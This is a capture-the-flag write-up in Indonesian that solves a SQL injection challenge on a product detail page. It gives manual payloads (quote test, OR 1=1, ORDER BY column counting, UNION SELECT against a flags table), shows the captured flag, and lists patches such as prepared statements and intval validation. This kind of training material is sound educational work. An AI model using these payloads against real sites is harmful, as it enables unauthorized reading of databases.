## Attack & Defense – SQL Injection pada Halaman Detail Produk

---

## 1. Identitas Soal

**Kategori :** Full Pwn & Defense

**Nama Soal :** Product Detail Injection

**Target :** Web Service Tim Lawan

**Metode :** SQL Injection Manual (tanpa scanning tools)

---

## 2. Deskripsi Soal

Pada web target terdapat halaman detail produk yang menampilkan data berdasarkan parameter `id` pada URL:

```
product.php?id=1
```

Parameter tersebut digunakan langsung dalam query database tanpa validasi, sehingga membuka celah **SQL Injection**.
Tujuan peserta adalah mengeksploitasi celah tersebut untuk mengambil flag, kemudian melakukan patch agar server aman kembali.

---

## 3. Cara Pengerjaan (Langkah Teknis)

### 3.1 Observasi Target

1. Buka halaman produk.
2. Perhatikan URL:

   ```
   product.php?id=1
   ```
3. Ubah nilai `id` secara manual.

---

### 3.2 Uji Kerentanan

Masukkan payload berikut:

```
product.php?id=1'
```

Jika muncul error database → query tidak aman.

---

### 3.3 Uji Boolean Injection

```
product.php?id=1 OR 1=1
```

Jika semua data muncul → SQL Injection berhasil.

---

### 3.4 Menentukan Jumlah Kolom

```
product.php?id=1 ORDER BY 1--
product.php?id=1 ORDER BY 2--
product.php?id=1 ORDER BY 3--
```

Saat error muncul, berarti kolom terakhir adalah yang valid.

---

### 3.5 UNION Attack untuk Ambil Data

```
product.php?id=1 UNION SELECT flag,2,3 FROM flags--
```

---

## 4. Hasil Flag

```
SLKS{Product_SQLi_Success}
```

Flag berhasil disubmit ke scoreboard.

---

## 5. Dampak Keamanan

* Data database dapat dibaca
* Sistem bisa diambil alih
* Kebocoran data sensitif

---

## 6. Defense (Patching)

1. Gunakan **prepared statement**
2. Validasi parameter dengan `intval()`
3. Nonaktifkan error database
4. Logging & monitoring
